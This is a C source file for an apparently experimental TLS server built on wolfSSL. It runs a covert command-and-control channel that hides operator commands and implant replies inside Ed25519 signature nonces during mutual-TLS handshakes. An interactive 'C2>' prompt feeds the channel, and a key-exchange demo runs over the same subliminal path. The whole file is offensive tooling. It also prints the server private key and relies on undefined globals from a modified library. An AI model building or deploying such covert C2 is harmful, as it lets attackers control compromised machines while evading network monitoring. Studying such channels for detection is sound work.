#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/wolfcrypt/libwolfssl_sources.h>
#include <wolfssl/wolfcrypt/sha512.h>
#include <wolfssl/wolfcrypt/ge_operations.h>
#include <pthread.h>

#define PORT 8443
#define SERVER_CERT "./certs/server-cert.pem"
#define SERVER_KEY  "./certs/server-key.pem"
#define CA_CERT     "./certs/ca-cert.pem"

const char *http_response = 
    "HTTP/1.1 200 OK\r\n\r\n";

#define MAX_LINE 256
#define MAX_B64_SIZE 4096

unsigned char client_key_b[32] = {0x00};
unsigned char client_key_n[64] = {0x00};

unsigned char server_key_b[32] = {0x00};
unsigned char server_key_n[64] = {0x00};

#define TX_BUFFER_SIZE 1024
#define RX_BUFFER_SIZE 1024

struct SubliminalBuffer {
    unsigned char tx_buffer_b[TX_BUFFER_SIZE];
    unsigned char tx_buffer_n[TX_BUFFER_SIZE * 2];
    int tx_buffer_len;
    int tx_buffer_index;
    char tx_type;

    unsigned char rx_buffer_b[RX_BUFFER_SIZE];
    unsigned char rx_buffer_n[RX_BUFFER_SIZE * 2];
    int rx_buffer_len;
    int rx_buffer_index;
    char rx_type;
};

#define COMMAND_BUFFER_SIZE 1024
#define COMMAND_START 0xA0, 0xA0
#define COMMAND_END 0xF0, 0xF1
#define COMMAND_EXECUTE 0xC1
#define COMMAND_DATA 0xC2
#define COMMAND_KEY_EX 0xB1

struct Command {
    unsigned char line_input[COMMAND_BUFFER_SIZE];
    unsigned char c_buffer_b[COMMAND_BUFFER_SIZE];
    unsigned char c_buffer_n[COMMAND_BUFFER_SIZE * 2];
    int c_buffer_len;

    unsigned char c_start[2];
    unsigned char c_end[2];
    unsigned char c_exec;
    unsigned char c_keyex;
    char channel;

    pthread_mutex_t lock;
};

int request_counter = 0;
int demo_type = 0;

int read_eddsa_private_key(const char *filename, unsigned char *raw_key) {
    FILE *fp;
    char line[MAX_LINE];
    char b64_data[MAX_B64_SIZE] = {0};
    unsigned char decoded[MAX_B64_SIZE];
    word32 decoded_len = MAX_B64_SIZE;
    
    fp = fopen(filename, "r");
    if (!fp) {
        fprintf(stderr, "Error opening file: %s\n", filename);
        return -1;
    }
    
    // Read and concatenate all base64 lines (skip BEGIN/END)
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "-") || strstr(line, "-")) {
            continue;
        }
        line[strcspn(line, "\r\n")] = 0;  // Remove newline
        strcat(b64_data, line);
    }
    fclose(fp);
    
    // Base64 decode
    if (Base64_Decode((const byte*)b64_data, strlen(b64_data), decoded, &decoded_len) != 0) {
        fprintf(stderr, "Error decoding base64\n");
        return -1;
    }
    
    // Extract the 32-byte Ed25519 key (last 32 bytes of DER structure)
    memcpy(raw_key, decoded + decoded_len - 32, 32);
    
    return 0;
}

void convert_to_bytes(unsigned char *in, unsigned char *out, int len){

    for (int i = 0; i < len / 2; i++) {
    out[i] = (in[i * 2] << 4) | in[i * 2 + 1];
    }
    
    return;

}

void convert_to_nibbles(unsigned char *bytes, size_t bytes_len, unsigned char *nibbles) {
    for (size_t i = 0; i < bytes_len; i++) {
        nibbles[i * 2] = (bytes[i] >> 4) & 0x0F;      // High nibble
        nibbles[i * 2 + 1] = bytes[i] & 0x0F;         // Low nibble
    }
    return;
}

void cleanup(WOLFSSL_CTX *ctx, WOLFSSL *ssl, int sockfd, int connfd) {
    if (ssl) {
        wolfSSL_shutdown(ssl);
        wolfSSL_free(ssl);
    }
    if (connfd >= 0) close(connfd);
    if (sockfd >= 0) close(sockfd);
    if (ctx) wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();
}

WOLFSSL_CTX* init_server_ctx() {
    WOLFSSL_CTX *ctx;
    
    wolfSSL_Debugging_ON();

    wolfSSL_Init();
    
    ctx = wolfSSL_CTX_new(wolfTLSv1_3_server_method());
    if (!ctx) {
        fprintf(stderr, "Failed to create SSL context\n");
        return NULL;
    }
    
    // Load server certificate
    if (wolfSSL_CTX_use_certificate_file(ctx, SERVER_CERT, SSL_FILETYPE_PEM) != SSL_SUCCESS) {
        fprintf(stderr, "Failed to load %s\n", SERVER_CERT);
        wolfSSL_CTX_free(ctx);
        return NULL;
    }
    
    // Load server private key
    if (wolfSSL_CTX_use_PrivateKey_file(ctx, SERVER_KEY, SSL_FILETYPE_PEM) != SSL_SUCCESS) {
        fprintf(stderr, "Failed to load %s\n", SERVER_KEY);
        wolfSSL_CTX_free(ctx);
        return NULL;
    }
    
    // Load CA certificate for client verification (mutual TLS)
    if (wolfSSL_CTX_load_verify_locations(ctx, CA_CERT, NULL) != SSL_SUCCESS) {
        fprintf(stderr, "Failed to load CA certificate: %s\n", CA_CERT);
        wolfSSL_CTX_free(ctx);
        return NULL;
    }
    
    // Require client certificate (mutual TLS)
    wolfSSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);

    printf("Certificates loaded, mTLS verification required, listening on narrowband subliminal channel.\n");

    g_subliminal_type = 0;

    return ctx;
}

int create_server_socket() {
    int sockfd;
    struct sockaddr_in servaddr;
    int opt = 1;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        fprintf(stderr, "Socket creation failed\n");
        return -1;
    }
    
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);
    
    if (bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
        fprintf(stderr, "Socket bind failed\n");
        close(sockfd);
        return -1;
    }
    
    if (listen(sockfd, 5) != 0) {
        fprintf(stderr, "Listen failed\n");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

int derive_r_value(
    byte* r_out,
    const byte* signature,
    const byte* public_key,
    const byte* private_key_seed,
    const byte* message,
    word32 message_len
)
{
    wc_Sha512 sha;
    byte hash[64];
    byte priv_hash[64];
    byte scalar_a[32];
    byte h[32];
    byte ha[32];
    byte neg_ha[32];

    const byte* R = signature;
    const byte* S = signature + 32;

    /* Ed25519 group order L (little-endian) */
    static const byte L[32] = {
        0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
        0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
    };

    /* -------------------------------------------------- */
    /* 1. Derive scalar a from seed                        */
    /* -------------------------------------------------- */
    wc_InitSha512(&sha);
    wc_Sha512Update(&sha, private_key_seed, 32);
    wc_Sha512Final(&sha, priv_hash);
    wc_Sha512Free(&sha);

    memcpy(scalar_a, priv_hash, 32);
    scalar_a[0]  &= 248;
    scalar_a[31] &= 127;
    scalar_a[31] |= 64;

    /* -------------------------------------------------- */
    /* 2. Compute h = H(R || A || M) mod L                 */
    /* -------------------------------------------------- */
    wc_InitSha512(&sha);
    wc_Sha512Update(&sha, R, 32);
    wc_Sha512Update(&sha, public_key, 32);
    wc_Sha512Update(&sha, message, message_len);
    wc_Sha512Final(&sha, hash);
    wc_Sha512Free(&sha);

    sc_reduce(hash);        /* reduces 64 → 32 */
    memcpy(h, hash, 32);

    /* -------------------------------------------------- */
    /* 3. Compute h·a                                     */
    /* ha = h * a mod L                                   */
    /* -------------------------------------------------- */
    sc_muladd(ha, h, scalar_a, (byte[32]){0});

    /* -------------------------------------------------- */
    /* 4. Compute −(h·a) = L − ha                          */
    /* -------------------------------------------------- */
    int borrow = 0;
    for (int i = 0; i < 32; i++) {
        int diff = (int)L[i] - (int)ha[i] - borrow;
        if (diff < 0) {
            diff += 256;
            borrow = 1;
        } else {
            borrow = 0;
        }
        neg_ha[i] = (byte)diff;
    }

    /* -------------------------------------------------- */
    /* 5. r = S + (−h·a) mod L                             */
    /* -------------------------------------------------- */
    sc_muladd(r_out, neg_ha, (byte[32]){1}, S);

    return 0;
}

void handle_client(WOLFSSL_CTX *ctx, int connfd, struct sockaddr_in *cli, struct SubliminalBuffer *buffer) {
    WOLFSSL *ssl = NULL;
    char http_buffer[1024];
    int ret;
    int override;

    //Set nonce override
    if(buffer->tx_type == 'n'){
        override = wc_ed25519_SetNonceOverride(0, 0, 'n', buffer->tx_buffer_n[buffer->tx_buffer_index]);
        //printf("\n nonce override for message %x set\n", buffer->tx_buffer_n[buffer->tx_buffer_index]);
    }else if(buffer->tx_type == 'b'){
        override = wc_ed25519_SetNonceOverride(&buffer->tx_buffer_b[buffer->tx_buffer_index], 32, 'b', 0);
        //printf("setting broadband override\n");
        //for(int i = 0; i < 32; i++)
        //    printf("%02x", buffer->tx_buffer_b[i]);
        //printf("\n");

    }else if(buffer->tx_type == 'x'){
        override = wc_ed25519_SetNonceOverride(0, 0, 'x', 0);
    }

    ssl = wolfSSL_new(ctx);
    if (!ssl) {
        fprintf(stderr, "Failed to create SSL object\n");
        close(connfd);
        return;
    }
    
    wolfSSL_set_fd(ssl, connfd);

    // TLS handshake
    ret = wolfSSL_accept(ssl);
    if (ret != SSL_SUCCESS) {
        int err = wolfSSL_get_error(ssl, ret);
        char error_string[80];
        wolfSSL_ERR_error_string(err, error_string);
        fprintf(stderr, "TLS handshake failed: %s\n", error_string);
        wolfSSL_free(ssl);
        close(connfd);
        return;
    }
    
    //printf("TLS handshake successful, version %s cipher %s\n", wolfSSL_get_version(ssl), wolfSSL_get_cipher(ssl));
    
    //copy last 4 bits of the certificateverify signature into the buffer
    //printf("Reading half-byte %x from client signature into narrowband buffer\n", nb_output);
    if(buffer->rx_type == 'n'){
        //printf("reading message %x into rx buffer\n", nb_output);
        buffer->rx_buffer_n[buffer->rx_buffer_index] = nb_output;
        buffer->rx_buffer_index += 1;
        buffer->rx_buffer_len += 1;
    }

    //decode signature data
    if(buffer->rx_type == 'b'){
        /*
        printf("raw signature data:\n");
        for(int i = 0; i < 64; i++){
            printf("%x", g_subliminal_data->signature[i]);
        }
        
        printf("using key to decode: ");
        for(int i = 0; i < 32; i++)
            printf("%02x",client_key_b[i]);
        */
        unsigned char decoded_msg[32] = {0};
        int decode = derive_r_value(decoded_msg, g_subliminal_data->signature, g_subliminal_data->public_key, client_key_b, g_subliminal_data->message, g_subliminal_data->message_length);
        
        /*
        printf("\ndecoded signature data:\n");
        for(int i = 0; i < 32; i++)
            printf("%x", decoded_msg[i]);
        */
        memcpy(&buffer->rx_buffer_b[buffer->rx_buffer_len], decoded_msg, 32);
        buffer->rx_buffer_len += 32;
        buffer->rx_buffer_index += 32;
    }


    // Check if client certificate was verified
    long verify_result = wolfSSL_get_verify_result(ssl);
    if (verify_result == 0) {
        //printf("Client certificate verified successfully\n");
    } else {
        printf("WARNING: Client certificate verification failed (code: %ld)\n", verify_result);
    }

    // Read HTTP request
    memset(http_buffer, 0, sizeof(http_buffer));
    ret = wolfSSL_read(ssl, http_buffer, sizeof(http_buffer) - 1);
    if (ret > 0) {
        //printf("Received %d bytes\n", ret);
        
        // Send HTTP response
        ret = wolfSSL_write(ssl, http_response, strlen(http_response));
        if (ret > 0) {
            //printf("Sent %d bytes response\n", ret);
        }
    }
    
    
    wolfSSL_shutdown(ssl);
    wolfSSL_free(ssl);
    close(connfd);
    
    

    request_counter++;
    //printf("Client disconnected\n");
}

void* read_input(void* arg) {
    struct Command *command_data = (struct Command*)arg;

    unsigned char buffer[COMMAND_BUFFER_SIZE];
    int buffer_size = 0;
    //printf("Command: ");

    while (1) {
        printf("\nC2> ");
        fflush(stdout);
        
        if (fgets(buffer, COMMAND_BUFFER_SIZE, stdin) == NULL) {
            break;
        }

        // Remove newline
        buffer[strcspn(buffer, "\n")] = 0;
        
        //printf("You entered: %s\n", buffer);

        for(int i = 0; i < COMMAND_BUFFER_SIZE; i++){
            if(buffer[i] == 0x00){
                buffer_size = i;
                break;
            }
        }
        
        // Check for quit command
        if (strcmp(buffer, "quit") == 0) {
            printf("Quit command received. Shutting down...\n");
            exit(0);
        }
        
        //parse command
        pthread_mutex_lock(&command_data->lock);

        //add C2 command sequences
        memcpy(&command_data->c_buffer_b,command_data->c_start, 2);
        memcpy(&command_data->c_buffer_b[2],&command_data->c_exec,1);
        memcpy(&command_data->c_buffer_b[3],buffer, buffer_size);
        memcpy(&command_data->c_buffer_b[buffer_size + 3], command_data->c_end, 2);
        command_data->c_buffer_len = buffer_size + 5;

        /*
        printf("command parsed as len %d byte sequence: ", command_data->c_buffer_len);
        for(int i = 0; i < command_data->c_buffer_len; i++){
            printf("%2x", command_data->c_buffer_b[i]);
        }
            */
        request_counter = 0;

        pthread_mutex_unlock(&command_data->lock);
    }
    return NULL;
}

void parse_rx_buffer(struct SubliminalBuffer *buffer){

    //printf("parsing rx buffer len %d index %d\n", buffer->rx_buffer_len, buffer->rx_buffer_index);

    if(buffer->rx_buffer_len > (RX_BUFFER_SIZE - 32)){
        printf("rx buffer full, clearing\n");
        memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
        memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE*2);
        buffer->rx_buffer_len = 0;
        buffer->rx_buffer_index = 0;
    }

    if(buffer->rx_type == 'n'){
    unsigned char c_start[2] = {COMMAND_START};
    unsigned char c_end[2] = {COMMAND_END};
    
    int start, end = 0;

    for (int i = 0; i < (buffer->rx_buffer_len - 3); i++) {
        if( buffer->rx_buffer_n[i] == ((c_start[0] >> 4) & 0x0F) && buffer->rx_buffer_n[i+1] == (c_start[0] & 0x0F) ){
            if( buffer->rx_buffer_n[i+2] == ((c_start[1] >> 4) & 0x0F) && buffer->rx_buffer_n[i+3] == (c_start[1] & 0x0F) ){
                start = i + 4;
                //printf("command sequence found\n");
                break;
            }
        }    
    }

    //if command sequence has been found, parse the rest of the buffer to find the finish sequence F0F1
    if(start != 0){
        for (int i = 0; i < (buffer->rx_buffer_len - 3); i++) {
            if( buffer->rx_buffer_n[i] == ((c_end[0] >> 4) & 0x0F) && buffer->rx_buffer_n[i+1] == (c_start[0] & 0x0F)){
                if( buffer->rx_buffer_n[i+2] == ((c_end[1] >> 4) & 0x0F) && buffer->rx_buffer_n[i+3] == (c_end[1] & 0x0F) ){
                    end = i;
                    //printf("command end sequence found pos %d, %d\n", start, end);
                    break;
                }
            }  
        }
    }else{
        return;
    }

    if(end != 0){
        if(buffer->rx_buffer_n[start] == ((COMMAND_DATA >> 4) & 0x0F) && (buffer->rx_buffer_n[start+1] & 0x0F) == (COMMAND_DATA & 0x0F)){
            //c2 message
            printf("Received reply: ");
            //message[end_index] = 0x00;
            for(int i = start + 2; i < end; i+=2){
                printf("%c", (buffer->rx_buffer_n[i] << 4) | buffer->rx_buffer_n[i+ 1]);
            }
            printf(" after %d handshakes\n", buffer->rx_buffer_index);

            //clear rx buffer
            memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
            memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
            buffer->rx_buffer_index = 0;
            buffer->rx_buffer_len = 0;
        }
    }else{
        return;
    }
}else if(buffer->rx_type == 'b'){
    //memcpy(buffer->rx_buffer_n, buffer->rx_buffer_b, 32);
    //convert_to_bytes(buffer->rx_buffer_n, buffer->rx_buffer_b, 32);
    unsigned char c_start[2] = {COMMAND_START};
    unsigned char c_end[2] = {COMMAND_END};
    int start, end = 0;
    
    /*
    printf("parsing rx buffer\n");
    for(int i = 0; i < buffer->rx_buffer_len; i++)
        printf("%02x,", buffer->rx_buffer_b[i]);
    
    printf("\n");
    */
    for (int i = 0; i < buffer->rx_buffer_len - 1; i++) {
            if( buffer->rx_buffer_b[i] == c_start[0] && buffer->rx_buffer_b[i+1] == c_start[1] ){
                    start = i + 2;
                    //printf("broadband command sequence found\n");
                    break;
            }
                
            }

    //if command sequence has been found, parse the rest of the buffer to find the finish sequence F0F0
    if(start != 0){
        for (int i = 0; i < buffer->rx_buffer_len - 1; i++) {
            if( buffer->rx_buffer_b[i] == c_end[0] && buffer->rx_buffer_b[i+1] == c_end[1] ){
                    end = i;
                    //printf("broadband command finish sequence found\n");
                }
        }
    }else{
        return;
    }

    //parse the command
    if(end != 0){
        if(buffer->rx_buffer_b[start] == COMMAND_DATA){
            printf("Received reply: ");
            //message[end_index] = 0x00;
            for(int i = start + 1; i < end; i++){
                printf("%c", buffer->rx_buffer_b[i]);
            }
            printf(" after %d handshakes\n", request_counter);

            //clear rx buffer
            memset(buffer->rx_buffer_b, 0x00, RX_BUFFER_SIZE);
            memset(buffer->rx_buffer_n, 0x00, RX_BUFFER_SIZE * 2);
            buffer->rx_buffer_index = 0;
            buffer->rx_buffer_len = 0;

        }
    }

}


    return;

    


}

void parse_command_buffer(struct Command *input, struct SubliminalBuffer *buffer)
{
    //check for a command in the input buffer 
    pthread_mutex_lock(&input->lock);

    //printf("parsing command buffer %d\n", input->c_buffer_len);
    if(input->c_buffer_len > 0){
        if(demo_type == 2){
            buffer->tx_type = 'n';
        }
        //printf("command found");
        //convert to half bytes
        convert_to_nibbles(input->c_buffer_b, input->c_buffer_len, input->c_buffer_n);
        //copy to tx buffer and set the length
        memcpy(buffer->tx_buffer_n, input->c_buffer_n, (input->c_buffer_len * 2));
        if(buffer->tx_type == 'n'){
            buffer->tx_buffer_len = input->c_buffer_len * 2;
            //printf("tx buffer len set to %d", buffer->tx_buffer_len);
        }else{
            buffer->tx_buffer_len = input->c_buffer_len;
            memcpy(buffer->tx_buffer_b, input->c_buffer_b, input->c_buffer_len);
        }
        //clear the command buffers
        memset(input->c_buffer_b, 0x00, COMMAND_BUFFER_SIZE);
        memset(input->c_buffer_n, 0x00, COMMAND_BUFFER_SIZE * 2);
        input->c_buffer_len = 0;

        buffer->tx_buffer_index = 0;
        buffer->tx_type = input->channel;

        if(buffer->tx_type == 'n'){
            g_subliminal_type = 0;
        }else if(buffer->tx_type == 'b'){
            g_subliminal_type = 1;
        }else{
            buffer->tx_type = 'x';
            g_subliminal_type = 2;
        }
    }

    pthread_mutex_unlock(&input->lock);

    return;
}

int main() {
    //variables for TLS socket connection
    int sockfd, connfd;
    struct sockaddr_in cli;
    socklen_t len;
    WOLFSSL_CTX *ctx = NULL;

    pthread_t input_thread;

    //initialize buffers
    struct SubliminalBuffer buffer = { {0x00}, {0x00}, 0, 0, 'x', {0x00}, {0x00}, 0, 0, 'x'};
    //initialize c2 input buffer with command sequences
    struct Command input = { {0x00}, {0x00}, {0x00}, 0, {COMMAND_START}, {COMMAND_END}, COMMAND_EXECUTE, COMMAND_KEY_EX, 'x', PTHREAD_MUTEX_INITIALIZER};

    //load private key and convert to half bytes
    printf("Reading private key\n");

    if (read_eddsa_private_key(SERVER_KEY, server_key_b) == 0) {
        printf("Ed25519 private key loaded:\n");
        for (int i = 0; i < 32; i++) {
            printf("%02x", server_key_b[i]);
        }
        printf("\n");
    } else {
        fprintf(stderr, "Failed to read private key\n");
        return 1;
    }
    convert_to_nibbles(server_key_b, 32, server_key_n);

    //start server
    printf("Starting wolfSSL HTTPS server on port %d...\n", PORT);
    
    ctx = init_server_ctx();
    if (!ctx) {
        return EXIT_FAILURE;
    }
    
    sockfd = create_server_socket();
    if (sockfd < 0) {
        cleanup(ctx, NULL, -1, -1);
        return EXIT_FAILURE;
    }

    printf("Server listening on https://localhost:%d\n", PORT);

    //select demo 
    printf("Select demo:\n1. Narrowband key exchange->Broadband C2 \n2. Narrowband C2\n");
    int demo_select = 0;
    scanf("%d", &demo_select);
    while (getchar() != '\n');

    if(demo_select == 1){
        printf("Starting private key exchange over narrowband channel\n");
        //copy command headers and key to tx buffer
        //have to add one extra byte at the beginning because the first tx message on startup gets missed by the client
        buffer.tx_buffer_b[0] = 0xFF;
        unsigned char temp[3] = { COMMAND_START, COMMAND_KEY_EX};
        memcpy(&buffer.tx_buffer_b[1], temp, 3);
        memcpy(&buffer.tx_buffer_b[4], server_key_b, 32);
        unsigned char temp2[2] = {COMMAND_END};
        memcpy(&buffer.tx_buffer_b[36], temp2, 2);
        convert_to_nibbles(buffer.tx_buffer_b, 38, buffer.tx_buffer_n);

        buffer.tx_buffer_len = 76;
        g_subliminal_type = 0;
        buffer.tx_type = 'n';
        buffer.rx_type = 'n';
    }

    if(demo_select == 2){
        //start new thread for input handling
        if (pthread_create(&input_thread, NULL, read_input, &input) != 0) {
            perror("Failed to create input thread");
            return 1;
        }
        
        demo_type = 2;

        pthread_detach(input_thread);
        input.channel = 'n';
        //set narrowband receive type
        buffer.rx_type = input.channel;

        //not transmitting at first
        buffer.tx_type = 'x';
        g_subliminal_type = 0;

    }

    while (1) {

        
        if(demo_select == 2){
            //check command buffer, if there is a command copy to the tx buffer
            parse_command_buffer(&input, &buffer);

            //handle client connection
            len = sizeof(cli);
            connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
            if (connfd < 0) {
                fprintf(stderr, "Accept failed\n");
                continue;
            }

            handle_client(ctx, connfd, &cli, &buffer);
            //increment the tx buffer counter and see if we have finished tx
            if(buffer.tx_type == 'n' && buffer.tx_buffer_len != 0){
                buffer.tx_buffer_index++;
            
            
            if(buffer.tx_buffer_index > buffer.tx_buffer_len){
                printf("sent command in %d handshakes\n", buffer.tx_buffer_index);
                buffer.tx_type = 'x';
                memset(buffer.tx_buffer_b, 0x00, TX_BUFFER_SIZE);
                memset(buffer.tx_buffer_n, 0x00, TX_BUFFER_SIZE * 2);
                buffer.tx_buffer_len = 0;
                buffer.tx_buffer_index = 0;
            }
        }
            //parse the rx buffer
            parse_rx_buffer(&buffer);

        }
    
        if(demo_select == 1){

            //check if key has been tx over narrowband
            if(buffer.tx_type == 'n' && buffer.tx_buffer_len != 0){
                buffer.tx_buffer_index++;
            
            
            if(buffer.tx_buffer_index > buffer.tx_buffer_len){
                printf("keys exchanged in %d handshakes\n", buffer.tx_buffer_index);

                printf("client key: ");
                //copy key from rx buffer
                for(int i = 6; i < 70; i++){
                printf("%x", buffer.rx_buffer_n[i]);
                client_key_n[i-6] = buffer.rx_buffer_n[i];
                }
                printf("\n");
                convert_to_bytes(client_key_n, client_key_b, 64);


                buffer.tx_type = 'x';
                memset(buffer.tx_buffer_b, 0x00, TX_BUFFER_SIZE);
                memset(buffer.tx_buffer_n, 0x00, TX_BUFFER_SIZE * 2);
                buffer.tx_buffer_len = 0;
                buffer.tx_buffer_index = 0;
                input.channel = 'b';
                buffer.rx_type = 'b';
                g_subliminal_type = 1;

                //start new thread for input handling
                printf("key exchange complete, starting input thread\n");
                if (pthread_create(&input_thread, NULL, read_input, &input) != 0) {
                    perror("Failed to create input thread");
                    return 1;
                }
                
                pthread_detach(input_thread);
                //input.channel = 'b';
                request_counter = 0;
            }
        }
            
            //check commands buffer
            parse_command_buffer(&input, &buffer);

            //handle client
            len = sizeof(cli);
            connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
            if (connfd < 0) {
                fprintf(stderr, "Accept failed\n");
                continue;
            }

            handle_client(ctx, connfd, &cli, &buffer);

            if(buffer.tx_type == 'b' && buffer.tx_buffer_len != 0){
                buffer.tx_buffer_index+= 32;
            

            if(buffer.tx_buffer_index > buffer.tx_buffer_len){
                printf("sent command in %d handshakes\n", buffer.tx_buffer_index/32);
                buffer.tx_type = 'x';
                memset(buffer.tx_buffer_b, 0x00, TX_BUFFER_SIZE);
                memset(buffer.tx_buffer_n, 0x00, TX_BUFFER_SIZE * 2);
                buffer.tx_buffer_len = 0;
                buffer.tx_buffer_index = 0;
            }
        }
            //handle tx broadband buffer
            parse_rx_buffer(&buffer);

        }
    }
    
    cleanup(ctx, NULL, sockfd, -1);
    return 0;
}

